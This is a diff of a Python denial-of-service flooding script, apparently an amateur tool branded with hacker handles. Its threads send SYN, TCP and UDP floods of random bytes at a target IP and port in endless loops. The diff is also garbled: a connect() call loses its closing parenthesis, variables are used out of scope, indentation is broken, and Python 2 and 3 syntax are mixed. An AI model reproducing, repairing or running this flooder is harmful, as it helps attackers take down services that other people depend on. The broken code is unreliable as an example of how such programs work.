@@ -60,7 +60,7 @@ class syn(threading.Thread):
     def run(self):
         for i in range(self.packets):
             try:
-                self.syn.connect((self.ip, self.port))
+                self.syn.connect((self.ip, self.port)
             except:
                 pass
 
@@ -79,20 +79,11 @@ class tcp(threading.Thread):
                 socket.connect(self.ip, self.port)
                 socket.setblocking(0)
                 socket.sendto(bytes,(self.ip, self.port))
-        while True:
-           try:
-               if size > 65507:
-               sys.exit("Invalid Number Of Packets!")
-               u = udp(ip,port,size,packets)
-               print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
+                t = tcp(ip,port,size,packets)
+                t.start()
+                print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
        
-    except KeyboardInterrupt:
-        print ("Stopping Flood!")
-        sys.exit()
-    except ('socket.error, msg'):
-        print ("Socket Couldn't Connect")
-        sys.exit()
-
+            except:
                 pass
 
 class udp(threading.Thread):
@@ -109,29 +100,23 @@ class udp(threading.Thread):
                 bytes = random._urandom(self.size)
                 if self.port == 0:
                     self.port = random.randrange(1, 65535)
-             self.udp.sendto(bytes,(self.ip, self.port))
-             u.start()
-             print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
-     except KeyboardInterrupt:
-        print ("Stopping Flood!")
-        sys.exit()
-     except ('socket.error, msg'):
-        print ("Socket Couldn't Connect")
-        sys.exit()
+                self.udp.sendto(bytes,(self.ip, self.port))
+                u = udp(ip,port,size,packets)
+                u.start()
+                print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
+       
+            except:
                 pass
 
-     while True:
-        try:
-            if size > 65507:
+while True:
+    try:
+        if size > 65507:
             sys.exit("Invalid Number Of Packets!")
-            t = tcp(ip,port,size,packets)
-            s = syn(ip,port,packets)
-            s.start()
-            print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ "   \033[97m" +ip+ "\033[0m" )
-     except KeyboardInterrupt:
+        s = syn(ip,port,packets)
+        s.start()
+    except KeyboardInterrupt:
         print ("Stopping Flood!")
         sys.exit()
-    except ('socket.error, msg'):
-        print ("Socket Couldn't Connect")
+    except socket.error, msg:
+        print "Socket Couldn't Connect"
         sys.exit()
-                pass
